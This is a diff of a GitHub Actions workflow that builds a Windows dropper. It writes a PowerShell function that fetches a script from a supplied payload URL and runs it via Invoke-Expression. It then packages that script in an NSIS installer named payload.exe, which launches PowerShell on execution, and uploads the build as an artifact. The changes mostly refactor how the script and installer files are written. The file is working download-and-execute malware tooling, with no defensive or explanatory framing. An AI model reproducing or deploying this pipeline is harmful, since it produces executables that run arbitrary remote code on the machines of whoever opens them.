@@ -13,54 +13,55 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    # Step 1: Checkout repository
-    - name: Checkout code
+    - name: Checkout repository
       uses: actions/checkout@v3
 
-    # Step 2: Install NSIS
     - name: Install NSIS
       shell: powershell
       run: choco install nsis -y
 
-    # Step 3: Create a PowerShell script dynamically
-    - name: Generate PowerShell script
+    - name: Generate PowerShell Script
       shell: powershell
       run: |
         $payloadUrl = "${{ github.event.inputs.payload_url }}"
-        $scriptPath = "script.ps1"
-        Set-Content -Path $scriptPath -Value "function Fetch-Execute {"
-        Add-Content -Path $scriptPath -Value "    param ([string]`$url)"
-        Add-Content -Path $scriptPath -Value "    try {"
-        Add-Content -Path $scriptPath -Value "        `$response = Invoke-RestMethod -Uri `$url"
-        Add-Content -Path $scriptPath -Value "        Invoke-Expression `$response"
-        Add-Content -Path $scriptPath -Value "    } catch {"
-        Add-Content -Path $scriptPath -Value "        Write-Host `"Error: Cannot fetch or execute script.`""
-        Add-Content -Path $scriptPath -Value "    }"
-        Add-Content -Path $scriptPath -Value "}"
-        Add-Content -Path $scriptPath -Value "Fetch-Execute -url `"$payloadUrl`""
+        $scriptContent = @"
+        function Fetch-Execute {
+            param ([string]`$url)
+            try {
+                `$response = Invoke-RestMethod -Uri `$url
+                Invoke-Expression `$response
+            } catch {
+                Write-Host `"Error: Cannot fetch or execute script.`"
+            }
+        }
+        Fetch-Execute -url `"$payloadUrl`"
+        "@
+        $scriptContent | Set-Content -Path "script.ps1" -Encoding UTF8
 
-    # Step 4: Create NSIS installer script dynamically
     - name: Generate NSIS Script
       shell: powershell
       run: |
-        $nsisPath = "script.nsi"
-        Set-Content -Path $nsisPath -Value '!define OUTPUT "payload.exe"'
-        Add-Content -Path $nsisPath -Value 'Outfile `$PLUGINSDIR\${OUTPUT}'
-        Add-Content -Path $nsisPath -Value 'Section'
-        Add-Content -Path $nsisPath -Value '  SetOutPath `$PLUGINSDIR'
-        Add-Content -Path $nsisPath -Value '  File script.ps1'
-        Add-Content -Path $nsisPath -Value '  nsExec::ExecToStack `"$%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe" -File "$PLUGINSDIR\script.ps1"`'
-        Add-Content -Path $nsisPath -Value 'SectionEnd'
+        $nsisScript = @"
+        !define OUTPUT "payload.exe"
 
-    # Step 5: Build EXE using NSIS
+        Outfile "${OUTPUT}"
+
+        Section
+          SetOutPath `$PLUGINSDIR
+          File "script.ps1"
+          nsExec::Exec '"$WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -File "$PLUGINSDIR\script.ps1"'
+        SectionEnd
+        "@
+        $nsisScript | Set-Content -Path "script.nsi" -Encoding UTF8
+
     - name: Build EXE using NSIS
       shell: cmd
       run: makensis script.nsi
 
-    # Step 6: Upload EXE as an artifact
     - name: Upload EXE Artifact
       uses: actions/upload-artifact@v4
       with:
         name: payload_exe
-        path: $PLUGINSDIR/payload.exe
+        path: payload.exe
+
 
